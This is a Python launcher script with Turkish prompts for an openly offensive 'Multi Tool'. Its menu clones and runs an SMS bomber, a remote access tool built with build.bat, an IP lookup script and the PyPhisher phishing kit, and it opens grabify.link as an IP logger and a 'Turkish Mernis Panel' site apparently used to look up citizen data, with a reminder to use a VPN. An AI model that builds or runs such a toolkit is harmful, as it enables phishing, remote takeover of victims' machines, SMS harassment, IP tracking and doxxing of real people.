import os
import time
import colorama
from colorama import Fore, Back, Style

# CMD FONKSIYON
os.system("title Multi Tool   by @zupppe")
os.system("@echo off")
os.system("cls")

# KLASÖRLER / FONKSİYONLAR
clear = lambda: os.system("cls")
sms_klasor = "erenbomb"
rat_klasor = "empyrean"
ipsorgu_klasor = "ipsorgu"
phishing_klasor = "PyPhisher"

# KOD
print(Fore.LIGHTBLUE_EX + """
 __    __     __  __     __         ______   __        ______   ______     ______     __        
/\ "-./  \   /\ \/\ \   /\ \       /\__  _\ /\ \      /\__  _\ /\  __ \   /\  __ \   /\ \       
\ \ \-./\ \  \ \ \_\ \  \ \ \____  \/_/\ \/ \ \ \     \/_/\ \/ \ \ \/\ \  \ \ \/\ \  \ \ \____  
 \ \_\ \ \_\  \ \_____\  \ \_____\    \ \_\  \ \_\       \ \_\  \ \_____\  \ \_____\  \ \_____\ 
  \/_/  \/_/   \/_____/   \/_____/     \/_/   \/_/        \/_/   \/_____/   \/_____/   \/_____/ 


{}[{}1{}] {}İp Logger
{}[{}2{}] {}Sms Bomber
{}[{}3{}] {}Remote Acces Tool (Rat)
{}[{}4{}] {}İp Sorgu {}# BAKIMDA #KODLANMA AŞAMASINDA
{}[{}5{}] {}Turkish Mernis Panel
{}[{}6{}] {}Phishing Sitesi {}# TERMUX / LINUX
                                                                                  
{}
""".format(Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.BLUE, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.BLUE, Fore.RESET))
anamenu_soru = input("{}Hangi Toola Giriş Yapmak İstersiniz: {}".format(Fore.BLUE, Fore.RESET))
#
if anamenu_soru == ("1"):
    clear()
    os.system("start https://grabify.link")
    clear()
    os.system("py tools.py")
if anamenu_soru == ("2"):
    clear()
    sms_soru = input("{}Önceden Sms Bomber Kurdun Mu? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
    if sms_soru == ("n"):
        clear()
        print("""




{}          
  ____                        _             __   ___   _ _    _            _                  
 |  _ \  ___  ___ _   _  __ _| | __ _ _ __  \ \ / (_) (_) | _| | ___ _ __ (_)_   _  ___  _ __ 
 | | | |/ _ \/ __| | | |/ _` | |/ _` | '__|  \ V /| | | | |/ / |/ _ \ '_ \| | | | |/ _ \| '__|
 | |_| | (_) \__ \ |_| | (_| | | (_| | |      | | | |_| |   <| |  __/ | | | | |_| | (_) | |   
 |____/ \___/|___/\__, |\__,_|_|\__,_|_|      |_|  \__,_|_|\_\_|\___|_| |_|_|\__, |\___/|_|   
                  |___/                                                      |___/     
{}       
    """.format(Fore.LIGHTBLUE_EX, Fore.RESET))
        time.sleep(2)
        clear()

        os.system("git clone https://github.com/vHzEren/erenbomb.git")
        os.chdir(sms_klasor)
        os.system("pip install -r requirements.txt")
        os.system("py erenbomb.py")
    if sms_soru == ("y"):
        clear()
        os.chdir(sms_klasor)
        os.system("py erenbomb.py")
    if sms_soru != ("y","n"):
        clear()
        print(Fore.LIGHTRED_EX +"Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
        time.sleep(3)
        os.system("py tools.py")
if anamenu_soru == ("3"):
        
    clear()
    rat_sorusu = input("{}Önceden Rat Kurdun mu? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
    if rat_sorusu == ("n"):
        clear()
        os.system("git clone https://github.com/addi00000/empyrean.git")
        os.chdir(rat_klasor)
        os.system("pip install -r requirements.txt")
        os.system("start install_python.bat")
        os.system("start build.bat")
        os.chdir("..")
        os.system("cls")
        os.system("py tools.py")
    if rat_sorusu == ("y"):
        clear()
        os.chdir(rat_klasor)
        os.system("start build.bat")
        os.chdir("..")
        os.system("cls")
        os.system("py tools.py")
    if rat_sorusu != ("y","n"):
        clear()
        print(Fore.LIGHTRED_EX + "Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
        time.sleep(3)
        os.system("py tools.py")
if anamenu_soru == ("4"):
    clear()
    ipsorusu = input("{}Önceden İp Sorgu Kurdun Mu? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
    if ipsorusu == ("n"):
        clear()
        print("""
{}          
  ____                        _             __   ___   _ _    _            _                  
 |  _ \  ___  ___ _   _  __ _| | __ _ _ __  \ \ / (_) (_) | _| | ___ _ __ (_)_   _  ___  _ __ 
 | | | |/ _ \/ __| | | |/ _` | |/ _` | '__|  \ V /| | | | |/ / |/ _ \ '_ \| | | | |/ _ \| '__|
 | |_| | (_) \__ \ |_| | (_| | | (_| | |      | | | |_| |   <| |  __/ | | | | |_| | (_) | |   
 |____/ \___/|___/\__, |\__,_|_|\__,_|_|      |_|  \__,_|_|\_\_|\___|_| |_|_|\__, |\___/|_|   
                  |___/                                                      |___/     
{}       
    """.format(Fore.LIGHTBLUE_EX, Fore.RESET))
        time.sleep(2)
        clear()
        os.system("git clone https://github.com/vHzEren/ipsorgu.git")
        os.chdir(ipsorgu_klasor)
        os.system("pip install requests")
        clear()
        os.system("py ipsorgu.py")
    if ipsorusu == ("y"):
        clear()
        os.chdir(ipsorgu_klasor)
        os.system("py ipsorgu.py")
    if ipsorusu != ("y","n"):
        clear()
        print(Fore.LIGHTRED_EX + "Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
        time.sleep(3)
        os.system("py tools.py")
if anamenu_soru == ("5"):
    clear()
    print(Fore.BLUE + "Panel Sitesine Yönlendiriliyorsunuz #VPN AÇMAYI UNUTMAYIN!")
    time.sleep(5)    
    os.system("start https://nopanel.run")
    os.system("py tools.py")
if anamenu_soru == ("6"):
    clear()
    termux_linux = input("{}Hangi sistemi kullanıyorsun ? {}termux{}/{}linux{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()

    if termux_linux == ("termux"):
        phishing = input("{}Önceden PyPhisher kurdun mu ? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
        if phishing == ("n"):
            clear()
            os.system("git clone https://github.com/vHzEren/PyPhisher.git")
            os.chdir(phishing_klasor)
            os.system("pkg install git python3 php openssh -y")
            os.system("pip3 install -r files/requirements.txt")
            os.system("pip3 install pyphisher")
            os.system("python3 pyphisher.py")
        if phishing == ("y"):
            os.chdir(phishing_klasor)
            os.system("python3 pyphisher.py")

    if termux_linux == ("linux"):
        phishing = input("{}Önceden PyPhisher kurdun mu ? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
        if phishing == ("n"):            
            clear()
            os.system("git clone https://github.com/vHzEren/PyPhisher.git")
            os.chdir(phishing_klasor)
            os.system("pip3 install -r files/requirements.txt")
            os.system("sudo pip3 install pyphisher")
            os.system("python3 pyphisher.py")
        if phishing == ("y"):
            os.chdir(phishing_klasor)
            os.system("python3 pyphisher.py")